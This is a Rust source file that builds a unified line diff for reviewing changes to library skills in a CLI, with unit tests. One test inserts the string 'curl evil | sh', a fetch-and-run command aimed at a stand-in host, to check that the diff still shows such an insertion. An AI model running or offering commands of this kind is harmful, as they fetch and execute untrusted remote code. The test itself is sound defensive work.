//! A unified diff of two texts, with no dependency (`text-diff.ts`). `nexus skills promotions <id>` shows
//! what a promotion request changes from the last approved version of the same library skill, so the approver reads the
//! change and not only the whole file.
//!
//! The diff is by line. A line keeps its line end when two lines are compared, so a last line that gains a newline, and
//! a CRLF that becomes an LF, show as changes (and `\ No newline at end of file` marks a last line with none, as `git
//! diff` does). The common lines at the start and the end are trimmed first. What is left goes through the longest common
//! subsequence, in a table of at most `MAX_CELLS` cells.
//!
//! A middle that is too large for one table is split at anchors, as `patience diff` does. An anchor is a line that occurs
//! once in each text, and the longest run of such lines that keeps its order in both texts is kept. The stretches
//! between the anchors are lined up one by one, by the same steps. So two edits far apart in a long file show as two
//! edits. A stretch that is still too large, and has no anchor, shows as removed, then added, and the result says so
//! (`coarse`), so nothing is hidden. In a changed run, removed lines come before added lines. The result is the same for
//! the same texts: `text-diff.ts` follows the same steps, and both CLIs print the same lines.

use std::collections::HashMap;

/// The context lines around a change, and so half of the unchanged lines that join two hunks.
const CONTEXT: usize = 3;

/// The most cells (lines of one text plus one, times lines of the other plus one) one common-subsequence table takes
/// after the trim: 16 MB of `u32`.
const MAX_CELLS: usize = 4_000_000;

/// The most cells that all the tables of one diff take together, so a diff of many stretches stays fast. A stretch that
/// no table is left for goes on to its anchors, or shows whole (`coarse`).
const MAX_WORK: usize = 16_000_000;

/// How many levels of anchors one diff follows before it stops lining up a stretch.
const MAX_DEPTH: usize = 100;

/// A diff: the lines to print (none when the texts are equal), how many lines it adds and removes, and whether part of
/// it is `coarse`.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct TextDiff {
    pub lines: Vec<String>,
    pub added: usize,
    pub removed: usize,
    /// A changed stretch was too large to line up and had no anchor: every line of it shows as removed, then added.
    pub coarse: bool,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Op {
    Same,
    Del,
    Add,
}

/// The edit script so far, whether a stretch fell back to the coarse form, and the cells that tables may still take.
struct Script {
    ops: Vec<Op>,
    coarse: bool,
    work: usize,
}

/// Appends the edit script from `a` to `b`. Lines at both ends that are equal come first. A middle that fits a table goes
/// through it. A larger middle is split at its anchors, and each stretch between two anchors goes through this again.
fn align(a: &[&str], b: &[&str], out: &mut Script, depth: usize) {
    let prefix = a.iter().zip(b).take_while(|(x, y)| x == y).count();
    let suffix = a[prefix..]
        .iter()
        .rev()
        .zip(b[prefix..].iter().rev())
        .take_while(|(x, y)| x == y)
        .count();
    let (mid_a, mid_b) = (&a[prefix..a.len() - suffix], &b[prefix..b.len() - suffix]);
    out.ops.extend(std::iter::repeat_n(Op::Same, prefix));
    if mid_b.is_empty() {
        out.ops.extend(std::iter::repeat_n(Op::Del, mid_a.len()));
    } else if mid_a.is_empty() {
        out.ops.extend(std::iter::repeat_n(Op::Add, mid_b.len()));
    } else {
        let cells = (mid_a.len() + 1).saturating_mul(mid_b.len() + 1);
        if cells <= MAX_CELLS && cells <= out.work {
            out.work -= cells;
            out.ops.extend(common_subsequence(mid_a, mid_b));
        } else {
            let anchors = if depth < MAX_DEPTH {
                anchors(mid_a, mid_b)
            } else {
                Vec::new()
            };
            if anchors.is_empty() {
                out.coarse = true;
                out.ops.extend(std::iter::repeat_n(Op::Del, mid_a.len()));
                out.ops.extend(std::iter::repeat_n(Op::Add, mid_b.len()));
            } else {
                let (mut from_a, mut from_b) = (0, 0);
                for (i, j) in anchors {
                    align(&mid_a[from_a..i], &mid_b[from_b..j], out, depth + 1);
                    out.ops.push(Op::Same);
                    (from_a, from_b) = (i + 1, j + 1);
                }
                align(&mid_a[from_a..], &mid_b[from_b..], out, depth + 1);
            }
        }
    }
    out.ops.extend(std::iter::repeat_n(Op::Same, suffix));
}

/// The anchors of two parts: pairs of positions of lines that occur once in each part, in the longest run that rises in
/// both. When two runs are as long, the one that patience sorting finds first wins, so both CLIs pick the same run.
fn anchors(a: &[&str], b: &[&str]) -> Vec<(usize, usize)> {
    let mut in_a: HashMap<&str, usize> = HashMap::new();
    for line in a {
        *in_a.entry(line).or_insert(0) += 1;
    }
    let mut in_b: HashMap<&str, (usize, usize)> = HashMap::new();
    for (at, line) in b.iter().enumerate() {
        in_b.entry(line).or_insert((0, at)).0 += 1;
    }
    let pairs: Vec<(usize, usize)> = a
        .iter()
        .enumerate()
        .filter_map(|(i, line)| match (in_a.get(line), in_b.get(line)) {
            (Some(1), Some(&(1, j))) => Some((i, j)),
            _ => None,
        })
        .collect();
    // Patience sorting: each pair goes on the first pile whose top lies at or after it in `b`.
    let mut piles: Vec<usize> = Vec::new();
    let mut before: Vec<Option<usize>> = vec![None; pairs.len()];
    for (at, (_, j)) in pairs.iter().enumerate() {
        let pile = piles.partition_point(|top| pairs[*top].1 < *j);
        before[at] = pile.checked_sub(1).map(|lower| piles[lower]);
        if pile == piles.len() {
            piles.push(at);
        } else {
            piles[pile] = at;
        }
    }
    let mut run = Vec::new();
    let mut at = piles.last().copied();
    while let Some(pair) = at {
        run.push(pairs[pair]);
        at = before[pair];
    }
    run.reverse();
    run
}

/// The edit script of two non-empty parts, from a table of the longest common subsequence of every pair of tails. At a
/// line that differs, the removal comes first when it loses nothing.
fn common_subsequence(a: &[&str], b: &[&str]) -> Vec<Op> {
    let width = b.len() + 1;
    let mut table = vec![0u32; (a.len() + 1) * width];
    for i in (0..a.len()).rev() {
        for j in (0..b.len()).rev() {
            table[i * width + j] = if a[i] == b[j] {
                table[(i + 1) * width + j + 1] + 1
            } else {
                table[(i + 1) * width + j].max(table[i * width + j + 1])
            };
        }
    }
    let mut ops = Vec::with_capacity(a.len() + b.len());
    let (mut i, mut j) = (0, 0);
    while i < a.len() && j < b.len() {
        if a[i] == b[j] {
            ops.push(Op::Same);
            i += 1;
            j += 1;
        } else if table[(i + 1) * width + j] >= table[i * width + j + 1] {
            ops.push(Op::Del);
            i += 1;
        } else {
            ops.push(Op::Add);
            j += 1;
        }
    }
    ops.extend(std::iter::repeat_n(Op::Del, a.len() - i));
    ops.extend(std::iter::repeat_n(Op::Add, b.len() - j));
    removed_first(ops)
}

/// In every run of changes, the removals first and then the additions, each in the order they came.
fn removed_first(ops: Vec<Op>) -> Vec<Op> {
    let mut out = Vec::with_capacity(ops.len());
    let mut at = 0;
    while at < ops.len() {
        if ops[at] == Op::Same {
            out.push(Op::Same);
            at += 1;
            continue;
        }
        let end = ops[at..]
            .iter()
            .position(|op| *op == Op::Same)
            .map_or(ops.len(), |n| at + n);
        let run = &ops[at..end];
        out.extend(run.iter().filter(|op| **op == Op::Del));
        out.extend(run.iter().filter(|op| **op == Op::Add));
        at = end;
    }
    out
}

/// `start,count` as a unified diff writes a range: a range of one line is its number alone, and an empty range starts at
/// the line before it.
fn range(before: usize, count: usize) -> String {
    let start = if count == 0 { before } else { before + 1 };
    if count == 1 {
        start.to_string()
    } else {
        format!("{start},{count}")
    }
}

fn line_text(line: &str) -> &str {
    line.strip_suffix('\n').unwrap_or(line)
}

/// The unified diff from `old` to `new`, labelled `--- old_label` and `+++ new_label`, with three lines of context.
pub fn unified_diff(old: &str, new: &str, old_label: &str, new_label: &str) -> TextDiff {
    let a: Vec<&str> = old.split_inclusive('\n').collect();
    let b: Vec<&str> = new.split_inclusive('\n').collect();
    let mut script = Script {
        ops: Vec::with_capacity(a.len() + b.len()),
        coarse: false,
        work: MAX_WORK,
    };
    align(&a, &b, &mut script, 0);
    let Script { ops, coarse, .. } = script;
    let changes: Vec<usize> = ops
        .iter()
        .enumerate()
        .filter(|(_, op)| **op != Op::Same)
        .map(|(at, _)| at)
        .collect();
    if changes.is_empty() {
        return TextDiff::default();
    }
    // The lines of each text consumed before each operation.
    let mut old_before = Vec::with_capacity(ops.len() + 1);
    let mut new_before = Vec::with_capacity(ops.len() + 1);
    let (mut i, mut j) = (0, 0);
    for op in &ops {
        old_before.push(i);
        new_before.push(j);
        if *op != Op::Add {
            i += 1;
        }
        if *op != Op::Del {
            j += 1;
        }
    }
    old_before.push(i);
    new_before.push(j);

    let mut lines = vec![format!("--- {old_label}"), format!("+++ {new_label}")];
    let mut first = 0;
    while first < changes.len() {
        let mut last = first;
        while last + 1 < changes.len() && changes[last + 1] - changes[last] - 1 <= 2 * CONTEXT {
            last += 1;
        }
        let start = changes[first].saturating_sub(CONTEXT);
        let end = (changes[last] + 1 + CONTEXT).min(ops.len());
        let old_count = old_before[end] - old_before[start];
        let new_count = new_before[end] - new_before[start];
        lines.push(format!(
            "@@ -{} +{} @@",
            range(old_before[start], old_count),
            range(new_before[start], new_count)
        ));
        for at in start..end {
            let (mark, line) = match ops[at] {
                Op::Same => (' ', a[old_before[at]]),
                Op::Del => ('-', a[old_before[at]]),
                Op::Add => ('+', b[new_before[at]]),
            };
            lines.push(format!("{mark}{}", line_text(line)));
            if !line.ends_with('\n') {
                lines.push("\\ No newline at end of file".to_string());
            }
        }
        first = last + 1;
    }
    let added = ops.iter().filter(|op| **op == Op::Add).count();
    let removed = ops.iter().filter(|op| **op == Op::Del).count();
    TextDiff {
        lines,
        added,
        removed,
        coarse,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn diff(old: &str, new: &str) -> Vec<String> {
        unified_diff(old, new, "old", "new").lines
    }

    #[test]
    fn equal_texts_have_no_diff() {
        assert_eq!(unified_diff("a\nb\n", "a\nb\n", "old", "new"), TextDiff::default());
        assert_eq!(unified_diff("", "", "old", "new"), TextDiff::default());
    }

    #[test]
    fn one_changed_line_shows_with_three_lines_of_context() {
        let old = "1\n2\n3\n4\n5\n6\n7\n8\n9\n";
        let new = "1\n2\n3\n4\nfive\n6\n7\n8\n9\n";
        assert_eq!(
            diff(old, new),
            [
                "--- old",
                "+++ new",
                "@@ -2,7 +2,7 @@",
                " 2",
                " 3",
                " 4",
                "-5",
                "+five",
                " 6",
                " 7",
                " 8"
            ]
        );
        let result = unified_diff(old, new, "old", "new");
        assert_eq!((result.added, result.removed, result.coarse), (1, 1, false));
    }

    #[test]
    fn a_change_at_the_start_and_at_the_end_trims_the_context_to_the_text() {
        assert_eq!(
            diff("a\nb\nc\n", "A\nb\nc\n"),
            ["--- old", "+++ new", "@@ -1,3 +1,3 @@", "-a", "+A", " b", " c"]
        );
        assert_eq!(
            diff("a\nb\nc\n", "a\nb\nC\n"),
            ["--- old", "+++ new", "@@ -1,3 +1,3 @@", " a", " b", "-c", "+C"]
        );
    }

    #[test]
    fn a_text_made_from_nothing_and_a_text_emptied() {
        assert_eq!(
            diff("", "x\ny\n"),
            ["--- old", "+++ new", "@@ -0,0 +1,2 @@", "+x", "+y"]
        );
        assert_eq!(
            diff("x\ny\n", ""),
            ["--- old", "+++ new", "@@ -1,2 +0,0 @@", "-x", "-y"]
        );
        assert_eq!(diff("", "x\n"), ["--- old", "+++ new", "@@ -0,0 +1 @@", "+x"]);
    }

    #[test]
    fn a_missing_final_newline_is_a_change_and_is_marked() {
        assert_eq!(
            diff("a\nb", "a\nb\n"),
            [
                "--- old",
                "+++ new",
                "@@ -1,2 +1,2 @@",
                " a",
                "-b",
                "\\ No newline at end of file",
                "+b"
            ]
        );
        assert_eq!(
            diff("a\nb\n", "a\nb\nc"),
            [
                "--- old",
                "+++ new",
                "@@ -1,2 +1,3 @@",
                " a",
                " b",
                "+c",
                "\\ No newline at end of file"
            ]
        );
    }

    #[test]
    fn changes_more_than_six_lines_apart_are_two_hunks_and_six_or_fewer_are_one() {
        let lines = |changed: &[usize]| -> String {
            (1..=20)
                .map(|n| {
                    if changed.contains(&n) {
                        format!("x{n}\n")
                    } else {
                        format!("{n}\n")
                    }
                })
                .collect()
        };
        let base = lines(&[]);
        // Changes at 3 and 10: six unchanged lines between them, so one hunk.
        let one = diff(&base, &lines(&[3, 10]));
        assert_eq!(one.iter().filter(|line| line.starts_with("@@")).count(), 1, "{one:?}");
        assert!(one.contains(&"@@ -1,13 +1,13 @@".to_string()), "{one:?}");
        // Changes at 3 and 11: seven between them, so two hunks.
        let two = diff(&base, &lines(&[3, 11]));
        let heads: Vec<&String> = two.iter().filter(|line| line.starts_with("@@")).collect();
        assert_eq!(heads, ["@@ -1,6 +1,6 @@", "@@ -8,7 +8,7 @@"]);
    }

    #[test]
    fn removed_lines_come_before_added_lines_in_a_changed_run() {
        assert_eq!(
            diff("keep\nold1\nold2\nkeep2\n", "keep\nnew1\nnew2\nnew3\nkeep2\n"),
            [
                "--- old",
                "+++ new",
                "@@ -1,4 +1,5 @@",
                " keep",
                "-old1",
                "-old2",
                "+new1",
                "+new2",
                "+new3",
                " keep2"
            ]
        );
    }

    #[test]
    fn a_moved_line_is_a_removal_and_an_addition() {
        assert_eq!(
            diff("a\nb\nc\nd\n", "b\nc\nd\na\n"),
            ["--- old", "+++ new", "@@ -1,4 +1,4 @@", "-a", " b", " c", " d", "+a"]
        );
    }

    #[test]
    fn a_line_end_that_changes_is_a_change_and_the_carriage_return_stays_in_the_text() {
        assert_eq!(
            diff("a\r\nb\r\n", "a\nb\r\n"),
            ["--- old", "+++ new", "@@ -1,2 +1,2 @@", "-a\r", "+a", " b\r"]
        );
    }

    #[test]
    fn texts_that_differ_in_too_many_lines_show_whole_and_say_so() {
        // 2001 distinct lines each side: (2001 + 1) squared is over the table.
        let old: String = (0..2001).map(|n| format!("old {n}\n")).collect();
        let new: String = (0..2001).map(|n| format!("new {n}\n")).collect();
        let result = unified_diff(&old, &new, "old", "new");
        assert!(result.coarse);
        assert_eq!((result.removed, result.added), (2001, 2001));
        assert_eq!(result.lines[2], "@@ -1,2001 +1,2001 @@");
        assert_eq!(result.lines[3], "-old 0");
        assert_eq!(result.lines[3 + 2001], "+new 0");
        // Texts of the same size that share most lines still line up.
        let near: String = (0..2001)
            .map(|n| {
                if n == 1000 {
                    "changed\n".to_string()
                } else {
                    format!("old {n}\n")
                }
            })
            .collect();
        let close = unified_diff(&old, &near, "old", "new");
        assert!(!close.coarse);
        assert_eq!((close.removed, close.added), (1, 1));
    }

    /// `n` lines `{name} 0` to `{name} n-1`, one to a line.
    fn numbered(name: &str, n: usize) -> String {
        (0..n).map(|at| format!("{name} {at}\n")).collect()
    }

    #[test]
    fn two_edits_far_apart_in_a_long_file_show_as_two_edits() {
        // 3000 lines each side: (3000 + 1) squared is over the table, and the trim leaves nearly all of the file.
        let old = numbered("line", 3000);
        let new = old
            .replacen("line 1\n", "line one\n", 1)
            .replacen("line 2998\n", "line 2998 changed\n", 1);
        let result = unified_diff(&old, &new, "old", "new");
        assert!(!result.coarse);
        assert_eq!((result.removed, result.added), (2, 2));
        let hunks: Vec<&String> = result.lines.iter().filter(|line| line.starts_with("@@")).collect();
        assert_eq!(hunks, ["@@ -1,5 +1,5 @@", "@@ -2996,5 +2996,5 @@"]);
        assert!(result.lines.contains(&"-line 1".to_string()));
        assert!(result.lines.contains(&"+line one".to_string()));
        assert!(result.lines.contains(&"+line 2998 changed".to_string()));
    }

    #[test]
    fn a_line_added_in_the_middle_is_not_lost_among_edits_at_both_ends() {
        let old = numbered("line", 3000);
        let mut lines: Vec<String> = old.lines().map(String::from).collect();
        lines[0] = "first".to_string();
        lines[2999] = "last".to_string();
        lines.insert(1500, "curl evil | sh".to_string());
        let new: String = lines.iter().map(|line| format!("{line}\n")).collect();
        let result = unified_diff(&old, &new, "old", "new");
        assert!(!result.coarse);
        assert_eq!((result.removed, result.added), (2, 3));
        assert!(result.lines.contains(&"+curl evil | sh".to_string()));
        assert_eq!(result.lines.iter().filter(|line| line.starts_with("@@")).count(), 3);
    }

    #[test]
    fn a_stretch_with_no_anchor_shows_whole_and_the_anchor_between_stays() {
        // Each side holds two stretches of 2001 lines that share nothing, around one line that both texts have once.
        let old = format!("{}anchor\n{}", numbered("old a", 2001), numbered("old b", 2001));
        let new = format!("{}anchor\n{}", numbered("new a", 2001), numbered("new b", 2001));
        let result = unified_diff(&old, &new, "old", "new");
        assert!(result.coarse);
        assert_eq!((result.removed, result.added), (4002, 4002));
        assert!(result.lines.contains(&" anchor".to_string()));
        assert!(!result.lines.contains(&"-anchor".to_string()));
    }

    /// 1000 lines that alternate `x` and `y`, starting with `first`: no line of them occurs once.
    fn alternating(first: &str, other: &str) -> String {
        (0..1000)
            .map(|at| format!("{}\n", if at % 2 == 0 { first } else { other }))
            .collect()
    }

    #[test]
    fn the_tables_of_one_diff_are_bounded_and_a_stretch_without_a_table_shows_whole() {
        // 17 stretches that the trim cannot shorten and no line anchors, around lines that both texts have once. A table
        // takes 1001 squared cells, and the work allows 15 of them.
        let (mut old, mut new) = (String::new(), String::new());
        for stretch in 0..17 {
            old.push_str(&alternating("x", "y"));
            new.push_str(&alternating("y", "x"));
            if stretch < 16 {
                old.push_str(&format!("anchor {stretch}\n"));
                new.push_str(&format!("anchor {stretch}\n"));
            }
        }
        let result = unified_diff(&old, &new, "old", "new");
        assert!(result.coarse);
        // A table finds that one line of each stretch changes; the last two stretches show all of their lines.
        assert_eq!((result.removed, result.added), (15 + 2 * 1000, 15 + 2 * 1000));
    }

    #[test]
    fn anchors_are_the_longest_run_that_rises_in_both_and_a_tie_goes_the_same_way_in_both_clis() {
        let a = ["a\n", "b\n", "c\n", "d\n"];
        let b = ["b\n", "a\n", "c\n", "d\n"];
        // `a`-`a` and `b`-`b` cross; the run that keeps `b`, `c` and `d` is the one that patience sorting finds.
        assert_eq!(anchors(&a, &b), [(1, 0), (2, 2), (3, 3)]);
        // A line that occurs twice in one part is not an anchor.
        assert_eq!(anchors(&["a\n", "a\n", "z\n"], &["a\n", "z\n"]), [(2, 1)]);
        assert_eq!(anchors(&["a\n"], &["b\n"]), []);
    }

    #[test]
    fn anchors_are_followed_only_so_deep() {
        // Level k has one line of its own, the markers of the levels below it, and its own marker. A marker is unique
        // only once the levels above it are split off. The last level has 2001 lines of its own, so no stretch fits a table.
        const LEVELS: usize = 103;
        let side = |junk: &str| {
            let mut text = String::new();
            for level in 1..=LEVELS {
                text.push_str(&numbered(
                    &format!("{junk}{level}"),
                    if level == LEVELS { 2001 } else { 1 },
                ));
                for later in level + 1..=LEVELS {
                    text.push_str(&format!("x{later}\n"));
                }
                text.push_str(&format!("x{level}\n"));
            }
            text
        };
        let result = unified_diff(&side("o"), &side("w"), "old", "new");
        assert!(result.coarse);
        // Levels 1 to 99 are split at their markers, which stay as they are; the stretch below that shows whole.
        assert!(!result.lines.contains(&"-x50".to_string()));
        assert!(!result.lines.contains(&"-x100".to_string()));
        assert!(result.lines.contains(&"-x101".to_string()));
        assert!(result.lines.contains(&"+x101".to_string()));
    }

    #[test]
    fn a_large_file_with_one_changed_line_is_cheap() {
        let old: String = (0..200_000).map(|n| format!("line {n}\n")).collect();
        let new = old.replace("line 100000\n", "line one hundred thousand\n");
        let result = unified_diff(&old, &new, "old", "new");
        assert_eq!((result.added, result.removed, result.coarse), (1, 1, false));
        assert_eq!(result.lines[2], "@@ -99998,7 +99998,7 @@");
    }

    #[test]
    fn a_very_long_line_is_compared_whole() {
        let long = "x".repeat(1_000_000);
        let result = unified_diff(&format!("{long}\n"), &format!("{long}y\n"), "old", "new");
        assert_eq!((result.added, result.removed), (1, 1));
        assert_eq!(result.lines[3].len(), 1 + long.len());
    }
}
